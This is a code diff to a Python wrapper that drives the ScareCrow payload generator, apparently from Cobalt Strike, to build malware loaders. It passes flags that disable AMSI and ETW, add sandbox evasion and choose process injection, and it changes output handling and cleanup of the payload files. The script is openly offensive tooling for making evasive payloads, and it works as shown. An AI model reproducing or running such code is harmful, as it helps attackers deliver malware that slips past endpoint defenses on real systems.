@@ -2,27 +2,33 @@
 import os.path
 from json import loads
 from sys import argv, exit
-from subprocess import check_output, Popen, PIPE, call
+from subprocess import call, DEVNULL, STDOUT
 
 
 def generate_payload(data):
+
+    call(["rm", "-r", "{}/.lib".format(data['script_path'])], stdout=DEVNULL, stderr=STDOUT)
+
     command = [data['scarecrow_executable'], '-I', data['payload'], '-Loader', data['loader'], '-domain', data['domain']]
 
-    if data['noamsi']:
+    if data['noamsi'] == 'true':
         command.append('-noamsi')
 
-    if data['noetw']:
+    if data['noetw'] == 'true':
         command.append('-noetw')
 
-    if data['nosleep']:
+    if data['nosleep'] == 'true':
         command.append('-nosleep')
 
-    if data['sandbox']:
+    if data['sandbox'] == 'true':
         command.append('-sandbox')
 
     if data['injection']:
         command.append('-injection')
         command.append('{}'.format(data['injection']))
+
+    command.append('-outpath')
+    command.append('{}'.format(os.path.dirname(data['payload'])))
 
     if data['loader_name']:
         if not data['loader_name'].endswith('.js') and not data['loader_name'].endswith('.hta'):
@@ -36,55 +42,19 @@ def generate_payload(data):
     elif not data['loader_name'] and data['loader'] in ["excel", "msiexec", "wscript"]:
         command.append('-O')
         command.append(filename)
-    
-    process = Popen(command, stdout=PIPE)
-    stdout, stderr = process.communicate()    
-    
-    if data['loader'] in ["binary", "dll", "control"]:
-        for row in stdout.decode('utf-8').splitlines():
-            if row.startswith('[*] Signing'):
-                filename = row
-                break
 
-        filename = filename.split('[*] Signing ')[1].split(' With a Fake Cert')[0]
+    call(command, stdout=DEVNULL, stderr=STDOUT)
+    call(["rm", data['payload']], stdout=DEVNULL, stderr=STDOUT)
 
-        if data['loader'] == "control" and not data['loader_name']:
-            filename = filename[:-3] + "cpl"
-
-        elif data['loader'] == "control" and data['loader_name']:
-            filename = data['loader_name']
-
-    call(['mv', data['cobaltstrike_directory'] + '/' + filename, os.path.dirname(data['payload']) + "/"])
-    
-    check_output(['rm', '-f', data['payload']])
-
-    response_message("Payload successfuly generated at: " + os.path.dirname(data['payload']) + "/" + filename)
-
-
-def normalize_data(json_data):
-    try:
-        data = {}
-        for key, value in json_data.items():
-            if value == "false" or value == "":
-                value = False
-            if value == "true":
-                value == True
-
-            data[key] = json_data[key]
-
-        return data
-
-    except Exception:
-        response_message("Error - Something went wrong normalizing the data.")
+    response_message("Payload successfuly generated at: " + os.path.dirname(data['payload']))
 
 
 def response_message(message):
     print(message)
     exit()
 
+
 if __name__ == '__main__':
     cobaltstrike_data = loads(argv[1:][0])
-    cobaltstrike_data = normalize_data(cobaltstrike_data)
 
     generate_payload(cobaltstrike_data)
-
